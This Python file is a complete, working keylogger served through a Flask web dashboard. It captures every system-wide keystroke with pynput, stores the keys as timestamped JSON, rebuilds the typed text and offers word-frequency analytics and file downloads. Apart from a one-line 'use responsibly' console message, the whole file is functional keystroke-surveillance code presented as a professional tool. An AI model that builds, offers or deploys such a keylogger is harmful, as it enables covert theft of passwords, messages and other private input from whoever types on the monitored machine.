from flask import Flask, request, jsonify, send_file
import os
import threading
import time
from datetime import datetime
import json
from pynput import keyboard
import signal
import sys

app = Flask(__name__)

# Global variables
keylogger_thread = None
keylogger_active = False
current_log_file = None
log_directory = "keylogs"

# Ensure log directory exists
os.makedirs(log_directory, exist_ok=True)

class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.listener = None
        
    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                key_data = {
                    'timestamp': timestamp,
                    'key': key.char,
                    'type': 'character'
                }
            else:
                key_data = {
                    'timestamp': timestamp,
                    'key': str(key),
                    'type': 'special'
                }
            
            # Write to file
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(key_data) + '\n')
                
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
    def stop_logging(self):
        if self.listener:
            self.listener.stop()

def keylogger_worker():
    global keylogger_active, current_log_file
    
    # Create log file with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    current_log_file = os.path.join(log_directory, f"keylog_{timestamp}.json")
    
    # Initialize keylogger
    keylogger = KeyLogger(current_log_file)
    keylogger.start_logging()
    
    # Keep thread alive while keylogger is active
    while keylogger_active:
        time.sleep(0.1)
    
    # Stop keylogger
    keylogger.stop_logging()

def generate_html():
    """Generate the complete HTML interface"""
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flask Keylogger Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .header p {
            opacity: 0.8;
            font-size: 1.1em;
        }
        
        .main-content {
            padding: 30px;
        }
        
        .status-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            border-left: 5px solid #e74c3c;
            transition: all 0.3s ease;
        }
        
        .status-card.active {
            border-left-color: #27ae60;
        }
        
        .status-text {
            font-size: 1.3em;
            font-weight: 600;
            color: #2c3e50;
        }
        
        .status-details {
            margin-top: 10px;
            color: #7f8c8d;
            font-size: 0.9em;
        }
        
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .btn {
            padding: 15px 25px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
        }
        
        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
        }
        
        .btn-stop:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(231, 76, 60, 0.3);
        }
        
        .btn-show {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
        }
        
        .btn-show:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
        }
        
        .message {
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
            display: none;
        }
        
        .message.success {
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .message.error {
            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .files-section {
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .file-list {
            display: none;
        }
        
        .file-item {
            padding: 20px;
            border-bottom: 1px solid #ecf0f1;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }
        
        .file-item:hover {
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            transform: translateX(5px);
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-name {
            font-weight: 600;
            color: #2c3e50;
            font-size: 1.1em;
            margin-bottom: 5px;
        }
        
        .file-details {
            color: #7f8c8d;
            font-size: 0.9em;
        }
        
        .file-content {
            display: none;
            padding: 20px;
        }
        
        .content-tabs {
            display: flex;
            margin-bottom: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 5px;
        }
        
        .tab {
            flex: 1;
            padding: 12px 20px;
            background: transparent;
            border: none;
            cursor: pointer;
            border-radius: 6px;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .tab.active {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            box-shadow: 0 2px 8px rgba(52, 152, 219, 0.3);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .reconstructed-text {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 400px;
            overflow-y: auto;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.2);
        }
        
        .analytics-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .analytics-card {
            background: linear-gradient(135deg, #ffffff, #f8f9fa);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #e9ecef;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .analytics-card h4 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.2em;
            display: flex;
            align-items: center;
        }
        
        .analytics-card h4::before {
            content: '📊';
            margin-right: 10px;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: 700;
            background: linear-gradient(135deg, #3498db, #2980b9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .word-frequency {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .word-tag {
            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            color: #1976d2;
            font-weight: 500;
        }
        
        .special-keys {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
            gap: 10px;
        }
        
        .special-key-item {
            text-align: center;
            padding: 12px 8px;
            background: linear-gradient(135deg, #f1f3f4, #e8eaf0);
            border-radius: 8px;
            font-size: 0.9em;
        }
        
        .log-entry {
            margin: 8px 0;
            padding: 12px;
            background: linear-gradient(135deg, #ffffff, #f8f9fa);
            border-radius: 6px;
            border-left: 3px solid #3498db;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        .log-timestamp {
            color: #7f8c8d;
            font-size: 0.8em;
        }
        
        .log-key {
            color: #2980b9;
            font-weight: 600;
        }
        
        .back-button {
            background: linear-gradient(135deg, #95a5a6, #7f8c8d);
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 20px;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .back-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(149, 165, 166, 0.3);
        }
        
        .no-files {
            text-align: center;
            padding: 40px;
            color: #7f8c8d;
            font-size: 1.1em;
        }
        
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 10px;
                border-radius: 10px;
            }
            
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .controls {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .analytics-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖥️ Flask Keylogger Dashboard</h1>
            <p>Professional Keystroke Monitoring & Analysis Tool</p>
        </div>
        
        <div class="main-content">
            <div id="status" class="status-card">
                <div class="status-text">Status: Inactive</div>
                <div class="status-details">Ready to start monitoring</div>
            </div>
            
            <div class="controls">
                <button id="startBtn" class="btn btn-start">▶️ Start Monitoring</button>
                <button id="stopBtn" class="btn btn-stop">⏹️ Stop Monitoring</button>
                <button id="showBtn" class="btn btn-show">📁 View Sessions</button>
            </div>
            
            <div id="message" class="message"></div>
            
            <div class="files-section">
                <div id="fileList" class="file-list"></div>
                <div id="fileContent" class="file-content"></div>
            </div>
        </div>
    </div>

    <script>
        let isActive = false;
        let currentFile = null;

        // DOM elements
        const statusEl = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const showBtn = document.getElementById('showBtn');
        const messageEl = document.getElementById('message');
        const fileListEl = document.getElementById('fileList');
        const fileContentEl = document.getElementById('fileContent');

        // Update status
        function updateStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    isActive = data.active;
                    const statusCard = document.getElementById('status');
                    
                    if (isActive) {
                        statusCard.className = 'status-card active';
                        statusCard.innerHTML = `
                            <div class="status-text">🟢 Status: Active</div>
                            <div class="status-details">Recording to: ${data.current_file || 'Unknown file'}</div>
                        `;
                    } else {
                        statusCard.className = 'status-card';
                        statusCard.innerHTML = `
                            <div class="status-text">🔴 Status: Inactive</div>
                            <div class="status-details">Ready to start monitoring</div>
                        `;
                    }
                })
                .catch(error => {
                    console.error('Error updating status:', error);
                });
        }

        // Show message
        function showMessage(text, type = 'success') {
            messageEl.textContent = text;
            messageEl.className = `message ${type}`;
            messageEl.style.display = 'block';
            setTimeout(() => {
                messageEl.style.display = 'none';
            }, 4000);
        }

        // Start keylogger
        startBtn.addEventListener('click', () => {
            startBtn.innerHTML = '<span class="loader"></span> Starting...';
            startBtn.disabled = true;
            
            fetch('/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    showMessage(data.message, data.status === 'started' ? 'success' : 'error');
                    updateStatus();
                })
                .finally(() => {
                    startBtn.innerHTML = '▶️ Start Monitoring';
                    startBtn.disabled = false;
                });
        });

        // Stop keylogger
        stopBtn.addEventListener('click', () => {
            stopBtn.innerHTML = '<span class="loader"></span> Stopping...';
            stopBtn.disabled = true;
            
            fetch('/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    showMessage(data.message, data.status === 'stopped' ? 'success' : 'error');
                    updateStatus();
                })
                .finally(() => {
                    stopBtn.innerHTML = '⏹️ Stop Monitoring';
                    stopBtn.disabled = false;
                });
        });

        // Show files
        showBtn.addEventListener('click', () => {
            showBtn.innerHTML = '<span class="loader"></span> Loading...';
            showBtn.disabled = true;
            
            fetch('/files')
                .then(response => response.json())
                .then(data => {
                    if (data.files) {
                        displayFiles(data.files);
                    } else {
                        showMessage('Error loading files', 'error');
                    }
                })
                .finally(() => {
                    showBtn.innerHTML = '📁 View Sessions';
                    showBtn.disabled = false;
                });
        });

        // Display files
        function displayFiles(files) {
            fileContentEl.style.display = 'none';
            fileListEl.innerHTML = '';
            
            if (files.length === 0) {
                fileListEl.innerHTML = '<div class="no-files">📂 No keylog sessions found<br><small>Start monitoring to create your first session</small></div>';
            } else {
                files.forEach(file => {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'file-item';
                    fileItem.innerHTML = `
                        <div class="file-name">📄 ${file.name}</div>
                        <div class="file-details">
                            💾 Size: ${(file.size / 1024).toFixed(2)} KB | 
                            🕒 Modified: ${file.modified}
                        </div>
                    `;
                    fileItem.addEventListener('click', () => viewFile(file.name));
                    fileListEl.appendChild(fileItem);
                });
            }
            
            fileListEl.style.display = 'block';
        }

        // View file content
        function viewFile(filename) {
            fetch(`/view/${filename}`)
                .then(response => response.json())
                .then(data => {
                    if (data.entries && data.processed) {
                        displayFileContent(filename, data.entries, data.processed);
                    } else {
                        showMessage('Error loading file content', 'error');
                    }
                })
                .catch(error => {
                    showMessage('Error loading file content', 'error');
                });
        }

        // Display file content
        function displayFileContent(filename, entries, processed) {
            fileListEl.style.display = 'none';
            
            let content = `<button class="back-button" onclick="goBack()">← Back to Sessions</button>`;
            content += `<h3>📊 Analysis of ${filename}</h3>`;
            
            // Create tabs
            content += `
                <div class="content-tabs">
                    <button class="tab active" onclick="showTab('reconstructed')">📝 Reconstructed Text</button>
                    <button class="tab" onclick="showTab('analytics')">📈 Analytics</button>
                    <button class="tab" onclick="showTab('raw')">🔧 Raw Data</button>
                </div>
            `;
            
            // Reconstructed text tab
            content += `
                <div id="reconstructed" class="tab-content active">
                    <h4>📄 What you typed:</h4>
                    <div class="reconstructed-text">${escapeHtml(processed.reconstructed_text || 'No text reconstructed')}</div>
                </div>
            `;
            
            // Analytics tab
            content += `
                <div id="analytics" class="tab-content">
                    <div class="analytics-grid">
                        <div class="analytics-card">
                            <h4>Session Overview</h4>
                            <p>⏱️ Duration: <span class="stat-number">${processed.analytics.session_duration}</span></p>
                            <p>⌨️ Total Keys: <span class="stat-number">${processed.analytics.total_keys}</span></p>
                            <p>🔤 Characters: <span class="stat-number">${processed.analytics.total_characters}</span></p>
                            <p>📝 Words: <span class="stat-number">${processed.analytics.total_words}</span></p>
                        </div>
                        
                        <div class="analytics-card">
                            <h4>Most Used Words</h4>
                            <div class="word-frequency">
                                ${Object.entries(processed.analytics.most_used_words || {}).map(([word, count]) => 
                                    `<span class="word-tag">${word} (${count})</span>`
                                ).join('') || '<span class="word-tag">No words detected</span>'}
                            </div>
                        </div>
                        
                        <div class="analytics-card">
                            <h4>Special Keys</h4>
                            <div class="special-keys">
                                ${Object.entries(processed.analytics.special_keys || {}).map(([key, count]) => 
                                    `<div class="special-key-item"><strong>${key}</strong><br>${count}</div>`
                                ).join('') || '<div class="special-key-item">No special keys</div>'}
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            // Raw data tab
            content += `
                <div id="raw" class="tab-content">
                    <h4>🔧 Raw Keylog Data (${entries.length} entries)</h4>
                    <div style="max-height: 400px; overflow-y: auto;">
            `;
            
            entries.slice(0, 100).forEach(entry => {
                const keyDisplay = entry.type === 'character' ? entry.key : entry.key.replace('Key.', '');
                content += `
                    <div class="log-entry">
                        <span class="log-timestamp">${entry.timestamp}</span> - 
                        <span class="log-key">${escapeHtml(keyDisplay)}</span>
                        <span style="color: #7f8c8d; font-size: 0.8em;">(${entry.type})</span>
                    </div>
                `;
            });
            
            if (entries.length > 100) {
                content += `<div class="log-entry" style="text-align: center; color: #7f8c8d;">... and ${entries.length - 100} more entries</div>`;
            }
            
            content += `
                    </div>
                </div>
            `;
            
            fileContentEl.innerHTML = content;
            fileContentEl.style.display = 'block';
        }

        // Show tab function
        function showTab(tabName) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            // Remove active class from all tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabName).classList.add('active');
            
            // Add active class to clicked tab
            event.target.classList.add('active');
        }

        // Escape HTML function
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Go back to file list
        function goBack() {
            fileContentEl.style.display = 'none';
            fileListEl.style.display = 'block';
        }

        // Initial status update
        updateStatus();
        
        // Update status every 3 seconds
        setInterval(updateStatus, 3000);
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return generate_html()

@app.route('/start', methods=['POST'])
def start_keylogger():
    global keylogger_thread, keylogger_active
    
    if not keylogger_active:
        keylogger_active = True
        keylogger_thread = threading.Thread(target=keylogger_worker)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        return jsonify({'status': 'started', 'message': 'Keylogger started successfully'})
    else:
        return jsonify({'status': 'already_running', 'message': 'Keylogger is already running'})

@app.route('/stop', methods=['POST'])
def stop_keylogger():
    global keylogger_active
    
    if keylogger_active:
        keylogger_active = False
        return jsonify({'status': 'stopped', 'message': 'Keylogger stopped successfully'})
    else:
        return jsonify({'status': 'not_running', 'message': 'Keylogger is not running'})

@app.route('/status')
def get_status():
    return jsonify({
        'active': keylogger_active,
        'current_file': current_log_file if keylogger_active else None
    })

@app.route('/files')
def list_files():
    try:
        files = []
        for filename in os.listdir(log_directory):
            if filename.endswith('.json'):
                filepath = os.path.join(log_directory, filename)
                file_stats = os.stat(filepath)
                files.append({
                    'name': filename,
                    'size': file_stats.st_size,
                    'modified': datetime.fromtimestamp(file_stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                })
        
        # Sort by modification time (newest first)
        files.sort(key=lambda x: x['modified'], reverse=True)
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/view/<filename>')
def view_file(filename):
    try:
        filepath = os.path.join(log_directory, filename)
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'})
        
        # Read and parse the log file
        entries = []
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    entry = json.loads(line.strip())
                    entries.append(entry)
                except json.JSONDecodeError:
                    continue
        
        # Process entries to reconstruct text
        processed_data = process_keylog_entries(entries)
        
        return jsonify({
            'entries': entries,
            'processed': processed_data
        })
    except Exception as e:
        return jsonify({'error': str(e)})

def process_keylog_entries(entries):
    """Process keylog entries to reconstruct readable text and provide analytics"""
    
    # Build text character by character for accuracy
    full_text = ""
    special_keys_count = {}
    
    for entry in entries:
        key = entry['key']
        key_type = entry['type']
        
        if key_type == 'character':
            full_text += key
        else:
            # Handle special keys
            key_name = key.replace('Key.', '').lower()
            
            # Count special keys
            if key_name in special_keys_count:
                special_keys_count[key_name] += 1
            else:
                special_keys_count[key_name] = 1
            
            if key_name == 'space':
                full_text += " "
            elif key_name == 'enter':
                full_text += "\n"
            elif key_name == 'tab':
                full_text += "\t"
            elif key_name == 'backspace':
                # Simply remove the last character
                if len(full_text) > 0:
                    full_text = full_text[:-1]
            elif not any(modifier in key_name for modifier in ['shift', 'ctrl', 'alt', 'cmd']):
                # Show other special keys (but ignore modifiers)
                full_text += f"[{key_name.upper()}]"
    
    # Extract words for analytics
    words_typed = [word for word in full_text.split() if len(word.strip()) > 0]
    
    # Create analytics
    analytics = {
        'total_keys': len(entries),
        'total_words': len(words_typed),
        'total_characters': sum(1 for entry in entries if entry['type'] == 'character'),
        'special_keys': special_keys_count,
        'most_used_words': get_word_frequency(words_typed),
        'session_duration': get_session_duration(entries)
    }
    
    return {
        'reconstructed_text': full_text,
        'analytics': analytics,
        'word_list': words_typed
    }

def get_word_frequency(words):
    """Get frequency of words typed"""
    from collections import Counter
    # Clean words and filter out very short words and special characters
    cleaned_words = []
    for word in words:
        # Remove special characters and convert to lowercase
        clean_word = ''.join(char.lower() for char in word if char.isalnum())
        if len(clean_word) > 2:  # Only words longer than 2 characters
            cleaned_words.append(clean_word)
    
    word_count = Counter(cleaned_words)
    return dict(word_count.most_common(10))

def get_session_duration(entries):
    """Calculate session duration"""
    if len(entries) < 2:
        return "Less than 1 minute"
    
    start_time = datetime.strptime(entries[0]['timestamp'], "%Y-%m-%d %H:%M:%S")
    end_time = datetime.strptime(entries[-1]['timestamp'], "%Y-%m-%d %H:%M:%S")
    duration = end_time - start_time
    
    hours = duration.seconds // 3600
    minutes = (duration.seconds % 3600) // 60
    
    if hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

@app.route('/download/<filename>')
def download_file(filename):
    try:
        filepath = os.path.join(log_directory, filename)
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'})
        
        return send_file(filepath, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)})

# Graceful shutdown
def signal_handler(sig, frame):
    global keylogger_active
    keylogger_active = False
    print('\nShutting down keylogger...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print("🖥️  Flask Keylogger Web Interface")
    print("=" * 50)
    print("🚀 Starting server...")
    print("🌐 Access the dashboard at: http://127.0.0.1:5000")
    print("⚠️  Use responsibly and with proper authorization")
    print("🛑 Press Ctrl+C to stop the server")
    print("=" * 50)
    
    app.run(debug=False, host='127.0.0.1', port=5000)